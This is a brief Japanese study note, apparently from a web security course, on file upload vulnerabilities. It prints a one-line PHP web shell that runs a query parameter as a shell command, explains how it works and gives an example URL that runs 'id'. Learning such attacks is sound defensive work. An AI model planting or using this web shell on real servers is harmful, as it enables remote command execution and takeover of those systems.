
Date: 2025-09-24
Tags: 
Links: [[WSA]], [[File Upload Vulnerabilities]]

***


```php
<?php echo system($_GET['command']); ?>
```

- $\_GET['command']：HTTP リクエストのクエリ文字列 ?command=... から値を取得します。
- system()：PHP の組み込み関数で、引数に与えた文字列をシェルで実行し、その標準出力を返します（実行結果は直接出力される）。
- echo：結果を HTTP レスポンスの本文としてクライアントに返します。
つまり、ブラウザやツールで https://example.com/exploit.php?command=id のようにアクセスすると、サーバ上で id コマンドが実行され、その出力が返ってくる — という動作をします。



***
# References